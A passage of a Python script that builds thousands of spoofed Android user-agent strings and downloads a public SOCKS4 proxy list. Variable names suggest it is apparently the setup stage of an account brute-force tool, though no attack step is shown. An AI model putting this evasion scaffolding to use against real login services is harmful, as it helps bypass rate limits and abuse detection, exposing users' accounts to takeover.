#-----------------[ IMPORT-MODULE ]-------------------
import requests,bs4,json,os,sys,random,datetime,time,re
import urllib3,rich,base64
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import print as rprint
from rich import pretty
from rich.text import Text as tekz
pretty.install()
CON=sol()
## RANDOM UA
#user_agent=[' Mozilla/5.0 (Linux; U; Android 4.1.5; en-US; GT-N9000 Build/IMM77D) AppleWebKit/534.26 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.137' Mozilla/5.0 (Linux; Android 4.4.2; en-us; SAMSUNG SM-W900W8 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Version/1.6 Chrome/28.0.1500.94 Mobile Safari/537.36',' Mozilla/5.0 (Linux; Android 4.4.2; pl-pl; SAMSUNG SM-N9005-ORANGE Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Version/1.5 Chrome/28.0.1500.94 Mobile Safari/537.36'Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36',' ' Mozilla/5.0 (Linux; Android 4.4.2; nl-nl; SAMSUNG SM-N9005/N9005XXUENC2 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Version/1.5 Chrome/28.0.1500.94 Mobile Safari/537.36' Mozilla/5.0 (Linux; Android 4.4.2; SM-N900V Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.114 Mobile Safari/537.36',' 'Mozilla/5.0 (Linux; Android 4.3; ja-jp; SC-01F Build/JSS15J) AppleWebKit/537.36 (KHTML, like Gecko) Version/1.5 Chrome/28.0.1500.94 Mobile Safari/537.36'Mozilla/5.0 (Linux; Android 4.3; ja-jp; SC-01F Build/JSS15J) AppleWebKit/537.36 (KHTML, like Gecko) Version/1.5 Chrome/28.0.1500.94 Mobile Safari/537.36 ','Mozilla/5.0 (Linux; Android 12; LM-Q720) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 12; LM-X420) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 4.3; ja-jp; SC-01F Build/JSS15J) AppleWebKit/537.36 (KHTML, like Gecko) Version/1.5 Chrome/28.0.1500.94 Mobile Safari/537.36'Mozilla/5.0 (Linux; Android 4.4.2; SAMSUNG-SM-N900A Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.92 Mobile Safari/537.36Mozilla/5.0 (Linux; Android 4.4.2; en-us; SAMSUNG-SM-N900A Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Version/1.5 Chrome/28.0.1500.94 Mobile Safari/537.36']
uas_bawaan = " Mozilla/5.0 (Linux; Android 6.0.1; SM-G532G Build/MMB29T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.91 Mobile Safari/537.36;]"
uas_2= "Mozilla/5.0 (Linux; U; Android 4.0.3; ko-kr; LG-L160L Build/IML74K) AppleWebkit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30"
uas_3 = "Mozilla/5.0 (Linux; U; Android 4.0.3; de-ch; HTC Sensation Build/IML74K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 "
uas_4 = " Mozilla/5.0 (Linux; U; Android 2.3; en-us) AppleWebKit/999+ (KHTML, like Gecko) Safari/999.9"
uas_5 = " Mozilla/5.0 (Linux; U; Android 2.3.5; zh-cn; HTC_IncredibleS_S710e Build/GRJ90) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1"
uas_6 = " Mozilla/5.0 (Linux; U; Android 2.3.5; en-us; HTC Vision Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1"
uas_7 = " Mozilla/5.0 (Linux; U; Android 2.3.4; fr-fr; HTC Desire Build/GRJ22) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1"
#uas_8 "Mozilla/5.0 (Linux; U; Android 2.3.4; en-us; T-Mobile myTouch 3G Slide Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1 "
#uas_j7prime = "Mozilla/5.0 (Linux; U; Android 2.3.3; zh-tw; HTC_Pyramid Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1Mozilla/5.0 (Linux; U; Android 2.3.3; zh-tw; HTC_Pyramid Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari"
uas_10 = " Mozilla/5.0 (Linux; U; Android 2.3.3; zh-tw; HTC Pyramid Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1"
uas_random = random.choice([" Mozilla/5.0 (Linux; U; Android 2.3.3; ko-kr; LG-LU3000 Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+","Mozilla/5.0 (Linux; Android 10; Nokia 5.1 Plus Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36"])
uas_asal = " Mozilla/5.0 (Linux; U; Android 2.3.3; en-us; HTC_DesireS_S510e Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1"
uas_asal= "Mozilla/5.0 (Linux; U; Android 2.3.3; en-us; HTC_DesireS_S510e Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile "
uas_asal = " Mozilla/5.0 (Linux; U; Android 2.3.3; de-de; HTC Desire Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1"
uas_random2 = random.choice(["Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]","Mozilla/5.0 (Linux; U; Android 2.2.1; en-gb; HTC_DesireZ_A7272 Build/FRG83D) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1","Mozilla/5.0 (Linux; U; Android 2.2.1; fr-fr; HTC_DesireZ_A7272 Build/FRG83D) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1 ","1Mozilla/5.0 (Linux; U; Android 2.2; en-sa; HTC_DesireHD_A9191 Build/FRF91) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1 "," Mozilla/5.0 (Linux; U; Android 2.2; fr-lu; HTC Legend Build/FRF91) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1"," Mozilla/5.0 (Linux; U; Android 2.3.3; de-ch; HTC Desire Build/FRF91) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1"])
#------------------[ USER-AGENT ]-------------------#
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
try:
     prox= requests.get('https://github.com/TheSpeedX/PROXY-List/blob/master/socks4.txt').text
     open('.proxy.txt','w').write(prox)
except Exception as e:
     exit(e)
for xd in range(10000):
	a='Mozilla/5.0 (Linux; Android'
	b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
	c=random.choice(['SAMSUNG GT-I9506/XXUDOE4 Build/LRX22C'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/6.4 Chrome/56.0.2924.87'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{a} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)

	aa='Mozilla/5.0 (Linux; Android'
	b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
	c=random.choice(['en-US; vivo 1807 Build/OPM1.171019.026'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.4.8.1012'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)

	aa='Mozilla/5.0 (Linux; Android'
	b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
	c=random.choice(['SAMSUNG SM-F900U Build/PPR1.180610.011'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/9.2 Chrome/67.0.3396.87'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)

	aa='Mozilla/5.0 (Linux; U; Android;'
	b=random.choice(['6','7','8','9','10','11','12'])
	c='en-us; Redmi 5 Plus Build/OPM1.171019.019'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.108 UCBrowser/13.4.0.1306'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
	ugen2.append(uaku2)

	aa='Mozilla/5.0 (Linux; U; Android;'
	b=random.choice(['6','7','8','9','10','11','12'])
	c='en-US; DANMA UA RYUJI Build/PPR2.180905.005)'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/12.9.2.1143'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
	ugen2.append(uaku2)

	aa='Mozilla/5.0 (Linux; Android'
	b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
	c=random.choice(['SAMSUNG GT-I9506/XXUDOE4 Build/LRX22C'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/6.4 Chrome/56.0.2924.87'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
def uaku():
	try:
		ua=open('bbnew.txt','r').read().splitlines()
		for ub in ua : 
			ugen.append(ub)
	except:
		a=requests.get('https://github.com/EC-1709/a/blob/main/bbnew.txt').text
		ua=open('.bbnew.txt','w')
		aa=re.findall('line">(.*?)<',str(a))
		for un in aa:
			ua.write(un+'\n')
		ua=open('.bbnew.txt','r').read().splitlines()

#-------------[ Indicator Random User Agent ]--------------#
ua_in = 'Mozilla/5.0 (Linux; U; Android 6.0; zh-CN; MZ-MEIZU_M5 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 MZBrowser/6.10.110-2018052111 UWS/2.11.0.33 Mobile Safari/537.36','Mozilla/5.0 (Linux; U; Android 6.0; zh-CN; MZ-MEIZU M6 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 MZBrowser/7.1.110-2018072414 UWS/2.11.0.33 Mobile Safari/537.36','Mozilla/5.0 (Linux; U; Android 6.0; zh-CN; MZ-U20 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 MZBrowser/7.1.110-2018072414 UWS/2.11.0.33 Mobile Safari/537.36','Mozilla/5.0 (Linux; U; Android 6.0; zh-CN; MZ-m2 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 MZBrowser/7.1.110-2018072414 UWS/2.11.0.33 Mobile Safari/537.36','Mozilla/5.0 (Linux; U; Android 6.0; zh-CN; MZ-MX6 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 MZBrowser/7.1.110-2018072414 UWS/2.11.0.33 Mobile Safari/537.36','Mozilla/5.0 (Linux; U; Android 6.0; zh-CN; MZ-Meizu M6s Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 MZBrowser/7.1.110-2018072414 UWS/2.11.0.33 Mobile Safari/537.36','Mozilla/5.0 (Linux; U; Android 5.1; zh-CN; MZ-M3s Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/7.2.110-2018082915 UWS/2.15.0.2 Mobile Safari/537.36','Mozilla/5.0 (Linux; U; Android 6.0; zh-CN; MZ-U20 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/7.2.110-2018082915 UWS/2.15.0.2 Mobile Safari/537.36','Mozilla/5.0 (Linux; U; Android 6.0; zh-CN; MZ-U10 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/7.2.110-2018082915 UWS/2.15.0.2 Mobile Safari/537.36','Mozilla/5.0 (Linux; U; Android 6.0; zh-CN; MZ-M3 Max Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/7.2.110-2018082915 UWS/2.15.0.2 Mobile Safari/537.36','Mozilla/5.0 (Linux; U; Android 7.0; zh-CN; MZ-MEIZU M6 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/7.2.110-2018082915 UWS/2.15.0.2 Mobile Safari/537.36','Mozilla/5.0 (Linux; U; Android 5.1; zh-CN; MZ-M3s Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/7.4.110-2018101016 UWS/2.15.0.2 Mobile Safari/537.36','Mozilla/5.0 (Linux; U; Android 6.0; zh-CN; MZ-M5s Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/7.4.110-2018101016 UWS/2.15.0.2 Mobile Safari/537.36','Mozilla/5.0 (Linux; U; Android 5.1; zh-CN; MZ-m2 note Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/7.4.110-2018101016 UWS/2.15.0.2 Mobile Safari/537.36','Mozilla/5.0 (Linux; U; Android 6.0; zh-CN; MZ-MEIZU_M5 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/7.4.110-2018101016 UWS/2.15.0.2 Mobile Safari/537.36','Mozilla/5.0 (Linux; U; Android 6.0; zh-CN; MZ-U10 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/7.4.110-2018101016 UWS/2.15.0.2 Mobile Safari/537.36','Mozilla/5.0 (Linux; U; Android 6.0; zh-CN; MZ-M5 Note Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/7.4.110-2018101016 UWS/2.15.0.2 Mobile Safari/537.36','Mozilla/5.0 (Linux; U; Android 7.0; zh-CN; MZ-M6T Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/7.5.110-2018110721 UWS/2.15.0.2 Mobile Safari/537.36','Mozilla/5.0 (Linux; U; Android 7.0; zh-CN; MZ-PRO 7 Plus Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/7.5.110-2018110721 UWS/2.15.0.2 Mobile Safari/537.36','Mozilla/5.0 (Linux; U; Android 6.0; zh-CN; MZ-MEIZU M6 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 MZBrowser/7.1.122-2018082410 UWS/2.11.0.33 Mobile Safari/537.36','Mozilla/5.0 (Linux; U; Android 5.1; zh-CN; MZ-m3 note Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/7.6.110-2018121017 UWS/2.15.0.2 Mobile Safari/537.36','Mozilla/5.0 (Linux; U; Android 6.0; zh-CN; MZ-meizu C9 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 MZBrowser/7.99.141-2018092915 UWS/2.11.0.33 Mobile Safari/537.36','Mozilla/5.0 (Linux; U; Android 6.0; zh-CN; MZ-PRO 7 Plus Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 MZBrowser/7.1.122-2018082410 UWS/2.11.0.33 Mobile Safari/537.36','Mozilla/5.0 (Linux; U; Android 5.1; zh-CN; MZ-m2 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/7.7.110-2019010410 UWS/2.15.0.2 Mobile Safari/537.36','Mozilla/5.0 (Linux; U; Android 7.0; zh-CN; MZ-MEIZU M6 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/7.5.110-2018110721 UWS/2.15.0.2 Mobile Safari/537.36','Mozilla/5.0 (Linux; U; Android 7.1.2; zh-CN; MZ-M6 Note Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/7.7.110-2019010410 UWS/2.15.0.2 Mobile Safari/537.36','Mozilla/5.0 (Linux; U; Android 6.0; zh-CN; MZ-PRO 6 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/7.7.110-2019010410 UWS/2.15.0.2 Mobile Safari/537.36','Mozilla/5.0 (Linux; U; Android 7.0; zh-CN; MZ-MEIZU M6 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/7.7.110-2019010410 UWS/2.15.0.2 Mobile Safari/537.36','Mozilla/5.0 (Linux; U; Android 7.0.0; zh-CN; MZ-PRO 6 Plus Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/7.6.110-2018121017 UWS/2.15.0.2 Mobile Safari/537.36','Mozilla/5.0 (Linux; U; Android 7.0; zh-CN; MZ-M6T Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/7.7.110-2019010410 UWS/2.15.0.2 Mobile Safari/537.36','Mozilla/5.0 (Linux; U; Android 6.0; zh-CN; MZ-M3E Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/7.7.110-2019010410 UWS/2.15.0.2 Mobile Safari/537.36','Mozilla/5.0 (Linux; U; Android 7.0; zh-CN; MZ-M5 Note Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/7.9.210-2019062516 UWS/2.15.0.4 Mobile Safari/537.36','Mozilla/5.0 (Linux; U; Android 5.1; zh-CN; MZ-m2 note Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/7.8.110-2019031217 UWS/2.15.0.4 Mobile Safari/537.36','Mozilla/5.0 (Linux; U; Android 7.1.2; zh-CN; MZ-M6 Note Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/7.9.210-2019062516 UWS/2.15.0.4 Mobile Safari/537.36','Mozilla/5.0 (Linux; U; Android 5.1; zh-CN; MZ-m2 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/7.10.110-2019071815 UWS/2.15.0.4 Mobile Safari/537.36','Mozilla/5.0 (Linux; U; Android 7.0; zh-CN; MZ-M6T Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/7.9.210-2019062516 UWS/2.15.0.4 Mobile Safari/537.36','Mozilla/5.0 (Linux; U; Android 7.0.0; zh-CN; MZ-PRO 6 Plus Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/7.8.110-2019031217 UWS/2.15.0.4 Mobile Safari/537.36','Mozilla/5.0 (Linux; U; Android 7.0; zh-CN; MZ-M5 Note Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/7.10.110-2019071815 UWS/2.15.0.4 Mobile Safari/537.36','Mozilla/5.0 (Linux; U; Android 5.1; zh-CN; MZ-MX4 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/7.8.110-2019031217 UWS/2.15.0.4 Mobile Safari/537.36','Mozilla/5.0 (Linux; U; Android 5.1; zh-CN; MZ-MX4 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/7.10.110-2019071815 UWS/2.15.0.4 Mobile Safari/537.36','Mozilla/5.0 (Linux; U; Android 6.0; zh-CN; MZ-PRO 6 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 MZBrowser/6.9.520-2018051516 UWS/2.11.0.33 Mobile Safari/537.36','Mozilla/5.0 (Linux; U; Android 6.0.1; zh-CN; MZ-PRO 6 Plus Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/7.9.210-2019062516 UWS/2.15.0.4 Mobile Safari/537.36','Mozilla/5.0 (Linux; U; Android 6.0; zh-CN; MZ-M6T Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 MZBrowser/6.9.520-2018082214 UWS/2.11.0.33 Mobile Safari/537.36','Mozilla/5.0 (Linux; U; Android 7.1.1; zh-CN; MZ-MX6 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/7.10.110-2019071815 UWS/2.15.0.4 Mobile Safari/537.36','Mozilla/5.0 (Linux; U; Android 6.0; zh-CN; MZ-M3 Max Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 MZBrowser/7.1.110-2018072414 UWS/2.11.0.33 Mobile Safari/537.36','Mozilla/5.0 (Linux; U; Android 8.1.0; zh-CN; MZ-meizu X8 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/7.2.120-2018092510 UWS/2.15.0.2 Mobile Safari/537.36','Mozilla/5.0 (Linux; U; Android 8.1.0; zh-CN; MZ-meizu M8 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/7.2.120-2018102909 UWS/2.15.0.2 Mobile Safari/537.36','Mozilla/5.0 (Linux; U; Android 6.0; zh-CN; MZ-M3_s Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 MZBrowser/6.9.520-2018031519 UWS/2.11.0.33 Mobile Safari/537.36','Mozilla/5.0 (Linux; U; Android 7.0; zh-CN; MZ-PRO 7 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/7.8.110-2019031217 UWS/2.15.0.4 Mobile Safari/537.36','Mozilla/5.0 (Linux; U; Android 7.1.2; zh-CN; MZ-M6 Note Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/7.12.110-2019110416 UWS/2.15.0.4 Mobile Safari/537.36','Mozilla/5.0 (Linux; U; Android 5.1; zh-CN; MZ-PRO 5 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/7.12.110-2019110416 UWS/2.15.0.4 Mobile Safari/537.36','Mozilla/5.0 (Linux; U; Android 6.0; zh-CN; MZ-PRO 6 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/7.12.110-2019110416 UWS/2.15.0.4 Mobile Safari/537.36','Mozilla/5.0 (Linux; U; Android 6.0; zh-CN; MZ-MX6 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/7.12.110-2019110416 UWS/2.15.0.4 Mobile Safari/537.36','Mozilla/5.0 (Linux; U; Android 5.1; zh-CN; MZ-M3 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/7.13.110-2019112819 UWS/2.15.0.4 Mobile Safari/537.36','Mozilla/5.0 (Linux; U; Android 9; zh-CN; MZ-Nokia 5.1 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/62.0.3202.97 MZBrowser/8.9.0 Mobile Safari/537.36','Mozilla/5.0 (Linux; U; Android 9; zh-CN; MZ-Nokia 5.1 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/8.1.310-2020040818 UWS/2.15.0.4 Mobile Safari/537.36','Mozilla/5.0 (Linux; U; Android 5.1.1; zh-CN; MZ-MX4 Pro Build/MRA58K) 